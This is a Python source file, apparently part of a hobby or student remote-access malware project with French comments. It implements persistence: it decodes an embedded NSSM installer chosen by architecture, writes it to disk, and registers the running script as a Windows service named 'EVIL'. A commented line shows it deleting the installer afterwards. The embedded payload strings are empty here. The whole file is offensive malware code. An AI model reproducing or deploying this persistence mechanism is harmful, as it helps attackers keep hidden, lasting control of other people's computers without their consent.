import base64
import platform
import os
from subprocess import call, getoutput
from sys import argv

from powershell import Powershell

class Persistence():
    def __init__(self):
        # self.absCwd = os.getcwd()
        self._thisPath = argv[0]
        self._absCwd = os.path.dirname(argv[0])
        self._serviceName = "EVIL"
        self._serviceInstaller = "nssm.exe"
        self._pythonPath = "C:/Users/WDAGUtilityAccount/AppData/Local/Programs/Python/Python39/python.exe"
        # Dans VScode pour enlever le line wrapping «'left-alt' + 'z'» 
        self._nssm32bitBase64 = ""
        self._nssm64bitBase64 = ""
        # self._pythonInstallBase64 = ""
        self._clientCompiledBase64 = ""

    
    def _archVersion(self):
        if getoutput(Powershell.GetInfo.ARCH.value).strip() == "64-bit":
            return self._nssm64bitBase64
        else:
            return self._nssm32bitBase64
        
    def _writePayload(self, path, filename, payload):
        # "Créer un nouveau fichier à partir du payload une string en base64"
        with open(f"{path}\\{filename}", "wb") as copy:
            copy.write(base64.b64decode(payload))
    
    def _serviceInstalled(self):
        #check if service is installed
        if getoutput(Powershell.Persist.CHECKEVILSTATUS.value).strip() == "":
            return False
        else:
            return True

    def _installService(self):
        print("Writing payload")
        self._writePayload(self._absCwd, self._serviceInstaller, self._archVersion())
        # TODO Install itself as a service

        print("installing service")
        call(f".\\{self._serviceInstaller} install {self._serviceName} {self._thisPath}")

        # call(f"del {self._absCwd}\\{self._fileName}")

        #.\nssm64.exe install "EVIL" "C:\Users\WDAGUtilityAccount\AppData\Local\Programs\Python\Python39\python.exe" "C:\Users\WDAGUtilityAccount\Desktop\client.py"

    
    def main(self):
        # print(getoutput(Powershell.Persist.CHECKEVILSTATUS.value))
        # print(Powershell.Persist.CHECKEVILSTATUS.value)
        # print(self._thisPath)
        self._installService()

if __name__ == "__main__":
    # print("OSPATH", os.path.dirname(argv[0]))
    # print("ARGPATH", argv[0])
    Persistence().main()
    